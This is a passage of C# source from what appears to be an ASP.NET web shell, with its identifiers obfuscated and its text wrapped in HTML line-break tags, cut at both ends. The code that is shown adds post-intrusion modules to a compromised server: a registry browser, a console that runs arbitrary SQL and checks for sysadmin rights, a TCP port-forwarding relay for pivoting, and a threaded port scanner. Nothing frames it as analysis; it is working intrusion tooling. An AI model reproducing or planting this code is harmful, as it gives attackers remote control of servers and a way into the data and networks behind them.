byte[] uPZ=new byte[1024];<br />
<br />
do<br />
<br />
{<br />
<br />
System.Threading.Thread.Sleep(50);<br />
<br />
int len=instream.Read(uPZ,0,uPZ.Length);<br />
<br />
FTBtf+=Encoding.Default.GetString(uPZ,0,len);<br />
<br />
}<br />
<br />
while(instream.DataAvailable);<br />
<br />
}<br />
<br />
Bin_Td_Res.InnerHtml+=&quot;&lt;font color=red&gt;&quot;+FTBtf.Replace(&quot;\0&quot;,&quot;&quot;)+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
protected void ZJiM(NetworkStream instream,string Sendstr)<br />
<br />
{<br />
<br />
if(instream.CanWrite)<br />
<br />
{<br />
<br />
byte[] uPZ=Encoding.Default.GetBytes(Sendstr);<br />
<br />
instream.Write(uPZ,0,uPZ.Length);<br />
<br />
}<br />
<br />
Bin_Td_Res.InnerHtml+=&quot;&lt;font color=blue&gt;&quot;+Sendstr+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
public void xFhz()<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
kkHN.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;RegShell &gt;&gt;&quot;;<br />
<br />
string txc=@&quot;HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG&quot;;<br />
<br />
vyX.Text=&quot;&quot;;<br />
<br />
foreach(string rootkey in txc.Split(&#039;|&#039;))<br />
<br />
{<br />
<br />
vyX.Text+=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Regread&#039;,&#039;&quot;+MVVJ(rootkey)+&quot;&#039;)\&quot;&gt;&quot;+rootkey+&quot;&lt;/a&gt; | &quot;;<br />
<br />
}<br />
<br />
lFAvw();<br />
<br />
}<br />
<br />
protected void lFAvw()<br />
<br />
{<br />
<br />
qPdI.Text=&quot;&quot;;<br />
<br />
string txc=@&quot;HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG&quot;;<br />
<br />
TableRow tr;<br />
<br />
TableCell tc;<br />
<br />
foreach(string rootkey in txc.Split(&#039;|&#039;))<br />
<br />
{<br />
<br />
tr=new TableRow();<br />
<br />
tc=new TableCell();<br />
<br />
string bg=OKM();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tc.Width=Unit.Parse(&quot;40%&quot;);<br />
<br />
tc.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Regread&#039;,&#039;&quot;+MVVJ(rootkey)+&quot;&#039;)\&quot;&gt;&quot;+rootkey+&quot;&lt;/a&gt;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
tc=new TableCell();<br />
<br />
tc.Width=Unit.Parse(&quot;60%&quot;);<br />
<br />
tc.Text=&quot;&amp;lt;RootKey&amp;gt;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
pLWD.Rows.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
protected void tpRQ(string Reg_Path)<br />
<br />
{<br />
<br />
if(!Reg_Path.EndsWith(&quot;\\&quot;))<br />
<br />
{<br />
<br />
Reg_Path=Reg_Path+&quot;\\&quot;;<br />
<br />
}<br />
<br />
qPdI.Text=Reg_Path;<br />
<br />
string cJG=Regex.Replace(Reg_Path,@&quot;\\[^\\]+\\?$&quot;,&quot;&quot;);<br />
<br />
cJG=Regex.Replace(cJG,@&quot;\\+&quot;,&quot;\\&quot;);<br />
<br />
TableRow tr=new TableRow();<br />
<br />
TableCell tc=new TableCell();<br />
<br />
string bg=OKM();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tc.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Regread&#039;,&#039;&quot;+MVVJ(cJG)+&quot;&#039;)\&quot;&gt;Parent Key&lt;/a&gt;&quot;;<br />
<br />
tc.Attributes[&quot;colspan&quot;]=&quot;2&quot; ;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
pLWD.Rows.Add(tr);<br />
<br />
try<br />
<br />
{<br />
<br />
string subpath;<br />
<br />
string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf(&quot;\\&quot;)+1,Reg_Path.Length-Reg_Path.IndexOf(&quot;\\&quot;)-1);<br />
<br />
RegistryKey rk=null;<br />
<br />
RegistryKey sk;<br />
<br />
if(Reg_Path.StartsWith(&quot;HKEY_LOCAL_MACHINE&quot;))<br />
<br />
{<br />
<br />
rk=Registry.LocalMachine;<br />
<br />
}<br />
<br />
else if(Reg_Path.StartsWith(&quot;HKEY_CLASSES_ROOT&quot;))<br />
<br />
{<br />
<br />
rk=Registry.ClassesRoot;<br />
<br />
}<br />
<br />
else if(Reg_Path.StartsWith(&quot;HKEY_CURRENT_USER&quot;))<br />
<br />
{<br />
<br />
rk=Registry.CurrentUser;<br />
<br />
}<br />
<br />
else if(Reg_Path.StartsWith(&quot;HKEY_USERS&quot;))<br />
<br />
{<br />
<br />
rk=Registry.Users;<br />
<br />
}<br />
<br />
else if(Reg_Path.StartsWith(&quot;HKEY_CURRENT_CONFIG&quot;))<br />
<br />
{<br />
<br />
rk=Registry.CurrentConfig;<br />
<br />
}<br />
<br />
if(kDgkX.Length&gt;1)<br />
<br />
{<br />
<br />
sk=rk.OpenSubKey(kDgkX);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
sk=rk;<br />
<br />
}<br />
<br />
foreach(string innerSubKey in sk.GetSubKeyNames())<br />
<br />
{<br />
<br />
tr=new TableRow();<br />
<br />
tc=new TableCell();<br />
<br />
bg=OKM();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tc.Width=Unit.Parse(&quot;40%&quot;);<br />
<br />
tc.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Regread&#039;,&#039;&quot;+MVVJ(Reg_Path+innerSubKey)+&quot;&#039;)\&quot;&gt;&quot;+innerSubKey+&quot;&lt;/a&gt;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
tc=new TableCell();<br />
<br />
tc.Width=Unit.Parse(&quot;60%&quot;);<br />
<br />
tc.Text=&quot;&amp;lt;SubKey&amp;gt;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
pLWD.Rows.Add(tr);<br />
<br />
}<br />
<br />
TableRow cKVA=new TableRow();<br />
<br />
cKVA.Attributes[&quot;style&quot;]=&quot;border-top:1px solid #fff;border-bottom:1px solid #ddd;&quot;;<br />
<br />
cKVA.Attributes[&quot;bgcolor&quot;]=&quot;#dddddd&quot;;<br />
<br />
TableCell JlmW=new TableCell();<br />
<br />
JlmW.Attributes[&quot;colspan&quot;]=&quot;2&quot; ;<br />
<br />
JlmW.Attributes[&quot;height&quot;]=&quot;5&quot;;<br />
<br />
cKVA.Cells.Add(JlmW);<br />
<br />
pLWD.Rows.Add(cKVA);<br />
<br />
foreach(string strValueName in sk.GetValueNames())<br />
<br />
{<br />
<br />
tr=new TableRow();<br />
<br />
tc=new TableCell();<br />
<br />
bg=OKM();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tc.Width=Unit.Parse(&quot;40%&quot;);<br />
<br />
tc.Text=strValueName;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
tc=new TableCell();<br />
<br />
tc.Width=Unit.Parse(&quot;60%&quot;);<br />
<br />
tc.Text=DdmPl(sk,strValueName);<br />
<br />
tr.Cells.Add(tc);<br />
<br />
pLWD.Rows.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public string DdmPl(RegistryKey sk,string strValueName)<br />
<br />
{<br />
<br />
object uPZ;<br />
<br />
string RaTGr=&quot;&quot;;<br />
<br />
try<br />
<br />
{<br />
<br />
uPZ=sk.GetValue(strValueName,&quot;NULL&quot;);<br />
<br />
if(uPZ.GetType()==typeof(byte[]))<br />
<br />
{<br />
<br />
foreach(byte tmpbyte in(byte[])uPZ)<br />
<br />
{<br />
<br />
if((int)tmpbyte&lt;16)<br />
<br />
{<br />
<br />
RaTGr+=&quot;0&quot;;<br />
<br />
}<br />
<br />
RaTGr+=tmpbyte.ToString(&quot;X&quot;);<br />
<br />
}<br />
<br />
}<br />
<br />
else if(uPZ.GetType()==typeof(string[]))<br />
<br />
{<br />
<br />
foreach(string tmpstr in(string[])uPZ)<br />
<br />
{<br />
<br />
RaTGr+=tmpstr;<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
RaTGr=uPZ.ToString();<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
return RaTGr;<br />
<br />
}<br />
<br />
public void vNCHZ()<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
YwLB.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;PortScan &gt;&gt;&quot;;<br />
<br />
}<br />
<br />
public void rAhe()<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
iDgmL.Visible=true;<br />
<br />
dQIIF.Visible=false;<br />
<br />
Bin_H2_Title.InnerText=&quot;DataBase &gt;&gt;&quot;;<br />
<br />
}<br />
<br />
protected void OUj()<br />
<br />
{<br />
<br />
if(Dtdr.State==ConnectionState.Closed)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Dtdr.ConnectionString=MasR.Text;<br />
<br />
Kkvb.Connection=Dtdr;<br />
<br />
Dtdr.Open();<br />
<br />
}<br />
<br />
catch(Exception Error)<br />
<br />
{<br />
<br />
xseuB(Error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
protected void fUzE()<br />
<br />
{<br />
<br />
if(Dtdr.State==ConnectionState.Open)<br />
<br />
Dtdr.Close();<br />
<br />
Dtdr.Dispose();<br />
<br />
Kkvb.Dispose();<br />
<br />
}<br />
<br />
public DataTable CYUe(string sqlstr)<br />
<br />
{<br />
<br />
OleDbDataAdapter da=new OleDbDataAdapter();<br />
<br />
DataTable Dstog=new DataTable();<br />
<br />
try<br />
<br />
{<br />
<br />
OUj();<br />
<br />
Kkvb.CommandType=CommandType.Text;<br />
<br />
Kkvb.CommandText=sqlstr;<br />
<br />
da.SelectCommand=Kkvb;<br />
<br />
da.Fill(Dstog);<br />
<br />
}<br />
<br />
catch(Exception)<br />
<br />
{<br />
<br />
}<br />
<br />
finally<br />
<br />
{<br />
<br />
fUzE();<br />
<br />
}<br />
<br />
return Dstog;<br />
<br />
}<br />
<br />
public DataTable[] Bin_Data(string query)<br />
<br />
{<br />
<br />
ArrayList list=new ArrayList();<br />
<br />
try<br />
<br />
{<br />
<br />
string str;<br />
<br />
OUj();<br />
<br />
query=query+&quot;\r\n&quot;;<br />
<br />
MatchCollection gcod=new Regex(&quot;[\r\n][gG][oO][\r\n]&quot;).Matches(query);<br />
<br />
int EmRX=0;<br />
<br />
for(int i=0;i&lt;gcod.Count;i++)<br />
<br />
{<br />
<br />
Match FJD=gcod[i];<br />
<br />
str=query.Substring(EmRX,FJD.Index-EmRX);<br />
<br />
if(str.Trim().Length&gt;0)<br />
<br />
{<br />
<br />
OleDbDataAdapter FgzeQ=new OleDbDataAdapter();<br />
<br />
Kkvb.CommandType=CommandType.Text;<br />
<br />
Kkvb.CommandText=str.Trim();<br />
<br />
FgzeQ.SelectCommand=Kkvb;<br />
<br />
DataSet cDPp=new DataSet();<br />
<br />
FgzeQ.Fill(cDPp);<br />
<br />
for(int j=0;j&lt;cDPp.Tables.Count;j++)<br />
<br />
{<br />
<br />
list.Add(cDPp.Tables[j]);<br />
<br />
}<br />
<br />
}<br />
<br />
EmRX=FJD.Index+3;<br />
<br />
}<br />
<br />
str=query.Substring(EmRX,query.Length-EmRX);<br />
<br />
if(str.Trim().Length&gt;0)<br />
<br />
{<br />
<br />
OleDbDataAdapter VwB=new OleDbDataAdapter();<br />
<br />
Kkvb.CommandType=CommandType.Text;<br />
<br />
Kkvb.CommandText=str.Trim();<br />
<br />
VwB.SelectCommand=Kkvb;<br />
<br />
DataSet arG=new DataSet();<br />
<br />
VwB.Fill(arG);<br />
<br />
for(int k=0;k&lt;arG.Tables.Count;k++)<br />
<br />
{<br />
<br />
list.Add(arG.Tables[k]);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
catch(SqlException e)<br />
<br />
{<br />
<br />
xseuB(e.Message);<br />
<br />
rom.Visible=false;<br />
<br />
}<br />
<br />
return(DataTable[])list.ToArray(typeof(DataTable));<br />
<br />
}<br />
<br />
public void JIAKU(string instr)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
OUj();<br />
<br />
Kkvb.CommandType=CommandType.Text;<br />
<br />
Kkvb.CommandText=instr;<br />
<br />
Kkvb.ExecuteNonQuery();<br />
<br />
}<br />
<br />
catch(Exception e)<br />
<br />
{<br />
<br />
xseuB(e.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void dwgT()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
OUj();<br />
<br />
if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)<br />
<br />
{<br />
<br />
if(Pvf.SelectedItem.Value!=&quot;&quot;)<br />
<br />
{<br />
<br />
Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());<br />
<br />
}<br />
<br />
}<br />
<br />
DataTable[] jxF=null;<br />
<br />
jxF=Bin_Data(jHIy.InnerText);<br />
<br />
if(jxF!=null &amp;&amp; jxF.Length&gt;0)<br />
<br />
{<br />
<br />
for(int j=0;j&lt;jxF.Length;j++)<br />
<br />
{<br />
<br />
rom.PreRender+=new EventHandler(lRavM);<br />
<br />
rom.DataSource=jxF[j];<br />
<br />
rom.DataBind();<br />
<br />
for(int i=0;i&lt;rom.Items.Count;i++)<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
rom.Items[i].CssClass=bg;<br />
<br />
rom.Items[i].Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
rom.Items[i].Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
rom.DataSource=null;<br />
<br />
rom.DataBind();<br />
<br />
}<br />
<br />
rom.Visible=true;<br />
<br />
}<br />
<br />
catch(Exception e)<br />
<br />
{<br />
<br />
xseuB(e.Message);<br />
<br />
rom.Visible=false;<br />
<br />
}<br />
<br />
}<br />
<br />
public void xTZY()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)<br />
<br />
{<br />
<br />
if(Pvf.SelectedItem.Value==&quot;&quot;)<br />
<br />
{<br />
<br />
rom.DataSource=null;<br />
<br />
rom.DataBind();<br />
<br />
return;<br />
<br />
}<br />
<br />
}<br />
<br />
OUj();<br />
<br />
DataTable zKvOw=new DataTable();<br />
<br />
DataTable jxF=new DataTable();<br />
<br />
DataTable baVJV=new DataTable();<br />
<br />
if(WYmo.SelectedItem.Text==&quot;MSSQL&quot; &amp;&amp; Pvf.SelectedItem.Value!=&quot;&quot;)<br />
<br />
{<br />
<br />
Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);<br />
<br />
}<br />
<br />
zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,&quot;SYSTEM TABLE&quot; });<br />
<br />
jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,&quot;TABLE&quot; });<br />
<br />
foreach(DataRow dr in zKvOw.Rows)<br />
<br />
{<br />
<br />
jxF.ImportRow(dr);<br />
<br />
}<br />
<br />
jxF.Columns.Remove(&quot;TABLE_CATALOG&quot;);jxF.Columns.Remove(&quot;TABLE_SCHEMA&quot;);jxF.Columns.Remove(&quot;DESCRIPTION&quot;);jxF.Columns.Remove(&quot;TABLE_PROPID&quot;);<br />
<br />
rom.PreRender+=new EventHandler(lRavM);<br />
<br />
rom.DataSource=jxF;<br />
<br />
rom.DataBind();<br />
<br />
for(int i=0;i&lt;rom.Items.Count;i++)<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
rom.Items[i].CssClass=bg;<br />
<br />
rom.Items[i].Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
rom.Items[i].Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
}<br />
<br />
rom.Visible=true;<br />
<br />
}<br />
<br />
catch(Exception e)<br />
<br />
{<br />
<br />
xseuB(e.Message);<br />
<br />
rom.Visible=false;<br />
<br />
}<br />
<br />
}<br />
<br />
private void lRavM(object sender,EventArgs e)<br />
<br />
{<br />
<br />
DataGrid d=(DataGrid)sender;<br />
<br />
foreach(DataGridItem item in d.Items)<br />
<br />
{<br />
<br />
foreach(TableCell t in item.Cells)<br />
<br />
{<br />
<br />
t.Text=t.Text.Replace(&quot;&lt;&quot;,&quot;&amp;lt;&quot;).Replace(&quot;&gt;&quot;,&quot;&amp;gt;&quot;);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
public void vCf()<br />
<br />
{<br />
<br />
dQIIF.Visible=true;<br />
<br />
try<br />
<br />
{<br />
<br />
jHIy.InnerHtml=string.Empty;<br />
<br />
if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)<br />
<br />
{<br />
<br />
rom.Visible=false;<br />
<br />
uXevN.Visible=true;<br />
<br />
irTU.Visible=true;<br />
<br />
OUj();<br />
<br />
DataTable ver=CYUe(@&quot;SELECT @@VERSION&quot;);<br />
<br />
DataTable dbs=CYUe(@&quot;SELECT name FROM master.dbo.sysdatabases&quot;);<br />
<br />
DataTable cdb=CYUe(@&quot;SELECT DB_NAME()&quot;);<br />
<br />
DataTable rol=CYUe(@&quot;SELECT IS_SRVROLEMEMBER(&#039;sysadmin&#039;)&quot;);<br />
<br />
DataTable YKrm=CYUe(@&quot;SELECT IS_MEMBER(&#039;db_owner&#039;)&quot;);<br />
<br />
string jHlh=ver.Rows[0][0].ToString();<br />
<br />
string dbo=string.Empty;<br />
<br />
if(YKrm.Rows[0][0].ToString()==&quot;1&quot;)<br />
<br />
{<br />
<br />
dbo=&quot;db_owner&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
dbo=&quot;public&quot;;<br />
<br />
}<br />
<br />
if(rol.Rows[0][0].ToString()==&quot;1&quot;)<br />
<br />
{<br />
<br />
dbo=&quot;&lt;font color=blue&gt;sa&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
string db_name=string.Empty;<br />
<br />
foreach(ListItem item in FGEy.Items)<br />
<br />
{<br />
<br />
 if(item.Selected=true)<br />
<br />
 {<br />
<br />
 item.Selected=false;<br />
<br />
 }<br />
<br />
}<br />
<br />
Pvf.Items.Clear();<br />
<br />
Pvf.Items.Add(&quot;-- Select a DataBase --&quot;);<br />
<br />
Pvf.Items[0].Value=&quot;&quot;;<br />
<br />
for(int i=0;i&lt;dbs.Rows.Count;i++)<br />
<br />
{<br />
<br />
db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),&quot;&lt;font color=blue&gt;&quot;+cdb.Rows[0][0].ToString()+&quot;&lt;/font&gt;&quot;)+&quot;&amp;nbsp;|&amp;nbsp;&quot;;<br />
<br />
Pvf.Items.Add(dbs.Rows[i][0].ToString());<br />
<br />
}<br />
<br />
irTU.InnerHtml=&quot;&lt;p&gt;&lt;font color=red&gt;MSSQL Version&lt;/font&gt; : &lt;i&gt;&lt;b&gt;&quot;+jHlh+&quot;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;font color=red&gt;SrvRoleMember&lt;/font&gt; : &lt;i&gt;&lt;b&gt;&quot;+dbo+&quot;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
uXevN.Visible=false;<br />
<br />
irTU.Visible=false;<br />
<br />
xTZY();<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception e)<br />
<br />
{<br />
<br />
dQIIF.Visible=false;<br />
<br />
}<br />
<br />
}<br />
<br />
public void MHLv()<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
hOWTm.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;PortMap &gt;&gt;&quot;;<br />
<br />
}<br />
<br />
public class PortForward<br />
<br />
{<br />
<br />
public string Localaddress;<br />
<br />
public int LocalPort;<br />
<br />
public string RemoteAddress;<br />
<br />
public int RemotePort;<br />
<br />
string type;<br />
<br />
Socket ltcpClient;<br />
<br />
Socket rtcpClient;<br />
<br />
Socket server;<br />
<br />
byte[] DPrPL=new byte[2048];<br />
<br />
byte[] wvZv=new byte[2048];<br />
<br />
public struct session<br />
<br />
{<br />
<br />
public Socket rdel;<br />
<br />
public Socket ldel;<br />
<br />
public int llen;<br />
<br />
public int rlen;<br />
<br />
}<br />
<br />
public static IPEndPoint mtJ(string host,int port)<br />
<br />
{<br />
<br />
IPEndPoint iep=null;<br />
<br />
IPHostEntry aGN=Dns.Resolve(host);<br />
<br />
IPAddress rmt=aGN.AddressList[0];<br />
<br />
iep=new IPEndPoint(rmt,port);<br />
<br />
return iep;<br />
<br />
}<br />
<br />
public void Start(string Rip,int Rport,string lip,int lport)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
LocalPort=lport;<br />
<br />
RemoteAddress=Rip;<br />
<br />
RemotePort=Rport;<br />
<br />
Localaddress=lip;<br />
<br />
rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);<br />
<br />
ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);<br />
<br />
rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
protected void iiGFO(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=new session();<br />
<br />
RKXy.ldel=ltcpClient;<br />
<br />
RKXy.rdel=rtcpClient;<br />
<br />
ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
protected void VTp(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=(session)ar.AsyncState;<br />
<br />
ltcpClient.EndConnect(ar);<br />
<br />
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);<br />
<br />
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
private void LFYM(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=(session)ar.AsyncState;<br />
<br />
int Ret=RKXy.rdel.EndReceive(ar);<br />
<br />
if (Ret&gt;0)<br />
<br />
ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);<br />
<br />
else lyTOK();<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
private void JTcp(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=(session)ar.AsyncState;<br />
<br />
RKXy.ldel.EndSend(ar);<br />
<br />
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
private void xPS(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=(session)ar.AsyncState;<br />
<br />
int Ret=RKXy.ldel.EndReceive(ar);<br />
<br />
if (Ret&gt;0)<br />
<br />
RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);<br />
<br />
else lyTOK();<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
private void IZU(IAsyncResult ar)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
session RKXy=(session)ar.AsyncState;<br />
<br />
RKXy.rdel.EndSend(ar);<br />
<br />
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
public void lyTOK()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
if (ltcpClient!=null)<br />
<br />
{<br />
<br />
ltcpClient.Close();<br />
<br />
}<br />
<br />
if (rtcpClient!=null)<br />
<br />
rtcpClient.Close();<br />
<br />
}<br />
<br />
catch (Exception ex) { }<br />
<br />
}<br />
<br />
}<br />
<br />
protected void vuou()<br />
<br />
{<br />
<br />
PortForward gYP=new PortForward();<br />
<br />
gYP.lyTOK();<br />
<br />
}<br />
<br />
protected void ruQO()<br />
<br />
{<br />
<br />
PortForward gYP=new PortForward();<br />
<br />
gYP.Start(llH.Value,int.Parse(ZHS.Value),eEpm.Value,int.Parse(iXdh.Value));<br />
<br />
}<br />
<br />
public string mRDl(string instr)<br />
<br />
{<br />
<br />
string tmp=null;<br />
<br />
try<br />
<br />
{<br />
<br />
tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();<br />
<br />
}<br />
<br />
catch(Exception e)<br />
<br />
{<br />
<br />
}<br />
<br />
return tmp;<br />
<br />
}<br />
<br />
public void VikG()<br />
<br />
{<br />
<br />
string[] OTV=lOmX.Text.ToString().Split(&#039;,&#039;);<br />
<br />
for(int i=0;i&lt;OTV.Length;i++)<br />
<br />
{<br />
<br />
IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));<br />
<br />
}<br />
<br />
try<br />
<br />
{<br />
<br />
Thread[] kbXY=new Thread[IVc.Count];<br />
<br />
int sdO=0;<br />
<br />
for(sdO=0;sdO&lt;IVc.Count;sdO++)<br />
<br />
{<br />
<br />
kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));<br />
<br />
kbXY[sdO].Start();<br />
<br />
}<br />
<br />
for(sdO=0;sdO&lt;kbXY.Length;sdO++)<br />
<br />
kbXY[sdO].Join();<br />
<br />
}<br />
<br />
catch<br />
<br />
{<br />
<br />
}<br />
<br />
}<br />
<br />
public class ScanPort<br />
<br />
{<br />
<br />
private string _ip=&quot;&quot;;<br />
<br />
private int jTdO=0;<br />
<br />
private TimeSpan _timeSpent;<br />
<br />
private string QGcH=&quot;Not scanned&quot;;<br />
<br />
public string ip<br />
<br />
{<br />
<br />
get { return _ip;}<br />
<br />
}<br />
<br />
public int port<br />
<br />
{<br />
<br />
get { return jTdO;}<br />
<br />
}<br />
<br />
public string status<br />
<br />
{<br />
<br />
get { return QGcH;}<br />
<br />
}<br />
<br />
public TimeSpan timeSpent<br />
<br />
{<br />
<br />
get { return _timeSpent;}<br />
<br />
}<br />
<br />
public ScanPort(string ip,int port)<br />
<br />
{<br />
<br />
_ip=ip;<br />
<br />
jTdO=port;<br />
<br />
}<br />
<br />
public void Scan()<br />
<br />
{<br />
<br />
TcpClient iYap=new TcpClient();<br />
<br />
DateTime qYZT=DateTime.Now;<br />
<br />
try<br />
<br />
{<br />
<br />
iYap.Connect(_ip,jTdO);<br />
<br />
iYap.Close();<br />
<br />
QGcH=&quot;&lt;font color=green&gt;&lt;b&gt;Open&lt;/b&gt;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
catch<br />
<br />
{<br />
<br />
QGcH=&quot;&lt;font color=red&gt;&lt;b&gt;Close&lt;/b&gt;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
_timeSpent=DateTime.Now.Subtract(qYZT);<br />
<br />
}<br />
<br />
}<br />
<br />
public static void YFcNP(System.Web.UI.Page page)<br />
<br />
{<br />
<br />
page.RegisterHiddenField(&quot;__EVENTTARGET&quot;,&quot;&quot;);<br />
<br />
page.RegisterHiddenField(&quot;__FILE&quot;,&quot;&quot;);<br />
<br />
string s=@&quot;&lt;script language=Javascript&gt;&quot;;<br />
<br />
